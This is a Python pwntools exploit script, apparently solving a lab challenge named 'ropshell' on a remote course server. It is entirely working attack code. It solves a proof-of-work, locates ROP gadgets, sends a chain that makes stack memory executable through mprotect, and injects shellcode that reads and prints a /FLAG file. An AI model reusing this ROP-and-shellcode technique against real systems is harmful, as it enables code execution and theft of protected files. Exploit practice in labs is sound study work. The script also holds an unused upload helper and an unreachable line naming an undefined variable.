#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import sys
import ctypes

from pwn import *

def solve(r):
    prefix=r.recvline().decode().split('\'')[1]
    for i in range(1000000000000):
        h=hashlib.sha1((prefix+str(i)).encode()).hexdigest();
        if(h[:6]=='000000'):
            ans=str(i).encode()
            break;
    print(time.time())
    r.sendlineafter(b'string S: ',base64.b64encode(ans));

def upload(fn):
    r.recvuntil(b'finish the transmission.\n\n');
    with open(fn, 'rb') as f: z = f.read();
    print("\x1b[1;32m** local md5({}): {}\x1b[m".format(fn, hashlib.md5(z).hexdigest()));
    z = base64.b64encode(z);
    for i in range(0, len(z), 768):
        r.sendline(z[i:i+768]);
    r.sendline(b'EOF');
    while True:
        z = r.recvline();
        if b'md5' in z:
            print(z.decode().strip());

def gadget(base,code,tar):
    assert code.find(asm(tar))!= -1, (tar, asm(tar).hex())
    ret = base+code.find(asm(tar))
    log.info(f"Found {hex(ret)}: '{tar}'")
    return ret

def send_rop(r,lst):
    msg = b''
    for l in lst:
        msg += p64(l)
    r.sendline(msg)

def main():
    context.arch = 'amd64'
    context.os = 'linux'
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        r = process("./ropshell", shell=False)
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)
    if type(r) != pwnlib.tubes.process.process:
        solve(r)
    r.recvuntil(b"Timestamp is ")
    timestamp = r.recvline().decode().strip()
    r.recvuntil(b"Random bytes generated at ")
    base = int(r.recvline().decode().strip(),16)

    log.info(f"{timestamp=}")
    log.info(f"{base=}, {hex(base)}")

    code = os.popen(f"./codegen {timestamp}").read()
    code = bytearray.fromhex(code)

    rax = gadget(base,code,"pop rax;ret")
    rdx = gadget(base,code,"pop rdx;ret")
    rdi = gadget(base,code,"pop rdi;ret")
    rsi = gadget(base,code,"pop rsi;ret")
    prax = gadget(base,code,"push rax;ret")
    syscall = gadget(base,code,"syscall;ret")

    log.info(f'{syscall=:x}')
    send_rop(r,[
        rax,60,rdi,37,syscall,
    ])

    stack = base - 0x2000

    send_rop(r,[
        rax,10,rdi,stack,rsi,10*0x10000,rdx,7,syscall,
        rax,0,rdi,0,rsi,stack+0x0000,rdx,20,syscall,
        rax,0,rdi,0,rsi,stack+0x0100,rdx,0x100,syscall,
        stack+0x0100,
    ])
    sleep(0.1)
    r.sendline(b"/FLAG\x00")
    sleep(0.1)
    shell=asm(f"\
    mov rax,2;mov rdi,{stack};mov rsi,0;syscall;\
    mov rdi,rax;mov rax,0;mov rsi,{stack+0x200};mov rdx,0x100;syscall;\
    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{stack+0x200};syscall;\
    mov rax,60;mov rdi,41;syscall;\
    ")+b'\x00'
    print(len(shell))
    r.sendline(shell)

    r.interactive()
    return

    r.send(nop.encode())


if __name__ == '__main__':
    main()
